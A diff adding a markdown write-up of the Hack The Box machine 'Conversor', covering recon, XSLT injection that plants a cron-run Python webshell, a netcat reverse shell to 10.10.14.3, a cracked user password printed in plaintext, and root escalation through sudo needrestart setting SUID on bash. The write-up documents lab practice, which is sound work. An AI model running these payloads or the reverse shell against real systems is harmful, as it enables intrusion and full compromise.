@@ -1,0 +1,306 @@
+﻿---
+title: 'HTB-Conversor'
+published: 2025-10-26
+draft: false
+toc: true
+tags: ["xslt-injection", "needrestart", "xml"]
+---
+
+```
+Scope:
+10.10.11.92
+```
+
+# Recon
+## Nmap
+
+```bash
+sudo nmap -sC -sV -sT -p- -vvvv -T5 --min-rate=5000 -Pn conversor.htb 
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack Apache httpd 2.4.52
+| http-title: Login
+|_Requested resource was /login
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+## 80/TCP - HTTP
+
+![](attachments/9213cb221db415e9702fe335600aef52.png)
+
+Using default `admin - admin` credentials I was able to log in:
+
+![](attachments/a934b1d5a33a63f5e6ffd123440a8be7.png)
+
+We notice that it's some sort of **File Upload Attack** involving `xml` and `xslt` files.
+
+I also noticed the JWT session cookie:
+
+![](attachments/f8cb264ab4ea771e6dc9d447f8672b84.png)
+
+![](attachments/0923aa7b2b342e6d09b1f858cca8746f.png)
+
+Before diving deeper into it I did a directory enum first:
+
+![](attachments/e78f3e6e026975d1f6d56d57791b169a.png)
+
+I went over to the `/about` page:
+
+![](attachments/fc4e8a1c306edca4d580e4f56f82e552.png)
+
+I downloaded the source code and took a look at it:
+
+![](attachments/3c438b9694476eca955e03a1adc4c59f.png)
+
+What was odd is that the *password* field was just being saved as `TEXT` in the `users.db`:
+
+![](attachments/67c491a793009405f5aff0f1c692437b.png)
+
+### Source Code analysis
+
+By skimming through the source code we find that the backend is running on **Flask**:
+
+![](attachments/25d9f3968303f2bd9a39d7df20db4fa5.png)
+
+We find multiple interesting finds like the `app.secret.key`:
+
+![](attachments/806e888ae82611002a2544607e164eb3.png)
+
+The `DB_PATH`:
+
+![](attachments/ff655da92ba759f1ea4f19725c85b882.png)
+
+Further down we see the `/login` page functionality:
+
+![](attachments/975f452dc6d757ec81b83d8bb835b7ce.png)
+
+Lastly we find the `/convert` logic as well as how to view the files:
+
+![](attachments/3c4ce76dcb9bb3bdb4307b34edc1de43.png)
+
+### XXE - FAIL
+
+So I went ahead and tested the upload functionality:
+
+![](attachments/641f6d32ebc8e8bffba4b3328ba12bca.png)
+
+![](attachments/b20e2ac8552a420923291ef39b2f40cc.png)
+
+I then went ahead and uploaded this together with the sample `xslt` file:
+
+![](attachments/78304de9ce7dac4864b1224cfac7af8f.png)
+
+![](attachments/fcb0ab16dee98fefc6d0b4a94ae57ea7.png)
+
+So naturally I tried to achieve **Local File Read** by using the following files:
+
+![](attachments/935f8e13da883ee5a8bcb148eed2942c.png)
+
+This however gave me the following error:
+
+![](attachments/de96043941612845428438f2412c54dd.png)
+
+Unfortunately this didn't work so I had to look further.
+
+
+### XSLT Injection
+
+I then referred to the [following repo](https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/#write-files-with-exslt-extension):
+
+![](attachments/e5af6db592ceab49b39894467ec310e1.png)
+
+![](attachments/951c8689112942d323fcf13887756efc.png)
+
+Checking out the `install.md` file which is already present in the source code we find this:
+
+![](attachments/0368ca78373b31ba9832ae4a7339dc64.png)
+
+That means that we now know the path to write to.
+
+# Exploitation
+## RCE as www-data
+
+I tried many payloads but in the end none worked. So instead I opted for uploading a webshell first:
+
+1. Upload `webshell.xslt`:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:exsl="http://exslt.org/common"
+  extension-element-prefixes="exsl"
+  version="1.0">
+  <xsl:template match="/">
+    <exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text"><![CDATA[#!/usr/bin/env python3
+# Cron-driven webshell runner
+# - reads /var/www/conversor.htb/static/cmd.txt
+# - executes its contents (shell)
+# - writes output to /var/www/conversor.htb/static/out.txt
+# - clears cmd.txt to avoid re-run
+
+import os, subprocess, traceback, time
+
+CMD_FILE = "/var/www/conversor.htb/static/cmd.txt"
+OUT_FILE = "/var/www/conversor.htb/static/out.txt"
+TMP_FILE = "/tmp/shell_runner_tmp"
+
+def write_out(data_bytes):
+    try:
+        with open(OUT_FILE, "wb") as f:
+            f.write(data_bytes)
+    except Exception as e:
+        try:
+            with open(OUT_FILE, "wb") as f:
+                f.write(str(e).encode())
+        except:
+            pass
+
+try:
+    if os.path.exists(CMD_FILE):
+        # read command (strip leading/trailing whitespace)
+        try:
+            with open(CMD_FILE, "r") as f:
+                cmd = f.read().strip()
+        except:
+            cmd = ""
+        if cmd:
+            try:
+                # run command via shell so pipes/etc. work
+                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+                out, _ = p.communicate(timeout=60)
+                if out is None:
+                    out = b''
+            except Exception:
+                out = traceback.format_exc().encode()
+            # write output atomically
+            try:
+                with open(TMP_FILE, "wb") as t:
+                    t.write(out)
+                os.replace(TMP_FILE, OUT_FILE)
+            except Exception:
+                write_out(out)
+            # clear command file to avoid re-execution
+            try:
+                open(CMD_FILE, "w").close()
+            except:
+                pass
+except Exception:
+    write_out(traceback.format_exc().encode())
+]]></exsl:document>
+    <xsl:text>done-writing-shell</xsl:text>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+Once that was uploaded I uploaded the following script: 
+
+2. Upload `write_cmd.xslt`:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:exsl="http://exslt.org/common"
+  extension-element-prefixes="exsl"
+  version="1.0">
+  <xsl:template match="/">
+    <exsl:document href="/var/www/conversor.htb/static/cmd.txt" method="text"><![CDATA[id
+]]></exsl:document>
+    <xsl:text>done-writing-cmd</xsl:text>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+I then uploaded it and confirmed RCE:
+
+![](attachments/bdb9e9b32f53d83d0583bbe2343895fa.png)
+
+Once I confirmed that it worked as I wanted I went ahead and uploaded the final version.
+
+3. Upload modified version of `write_cmd.xslt`:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:exsl="http://exslt.org/common"
+  extension-element-prefixes="exsl"
+  version="1.0">
+  <xsl:template match="/">
+    <exsl:document href="/var/www/conversor.htb/static/cmd.txt" method="text"><![CDATA[busybox nc 10.10.14.3 443 -e bash
+]]></exsl:document>
+    <xsl:text>done-writing-cmd</xsl:text>
+  </xsl:template>
+</xsl:stylesheet>
+```
+
+After a short while I got a hit:
+
+![](attachments/132fa611562e67c24ac6904c06d282a4.png)
+
+Once I was in I checked the present users:
+
+![](attachments/8ff35e2ba519c312e1c60efe347bf3bf.png)
+
+## Enumeration
+
+I started checking out the directory I landed in and found a populated `users.db`:
+
+![](attachments/af07bd9d4962b2814d8246dc639b8d34.png)
+
+This is an easily crackable `md5` hash:
+
+![](attachments/32426107b9481f6fff9fd882dfc8e81d.png)
+
+## SSH as fismathack
+
+Using the found creds I logged in via `ssh`:
+
+```
+fismathack
+Keepmesafeandwarm
+```
+
+![](attachments/4efcdf71a87d7a951f376ffa3f129864.png)
+
+### user.txt
+
+![](attachments/d5f73158f0e6a6ccba2cc7d043765f68.png)
+
+# Privilege Escalation
+## needrestart
+
+Using `sudo -l` I found this:
+
+![](attachments/d683c20e00885de6d5ee1579faca3d27.png)
+
+I wasn't familiar with this tool but it seemed to be non-default so I looked it up:
+
+![](attachments/d981f21ca5d62147b25a36ec20dd9060.png)
+
+I started checking it out and it turns out we can execute files using the `-c` flag.
+
+![](attachments/be6666632cc0cca5553e4ff9ec389229.png)
+
+Since we can do this as *root* we can easily escalate privs.
+
+```bash
+echo 'system("chmod +s /bin/bash");' > root.sh
+sudo /usr/sbin/needrestart -c root.sh
+```
+
+![](attachments/50ec901343bf8be6fb6087e6a54a4c99.png)
+
+### root.txt
+
+![](attachments/47fb6ea40eaefefb517d520e1a9630b7.png)
+
+![](attachments/b60895e06924cca63e43c5cc06c5594c.png)
+
+---
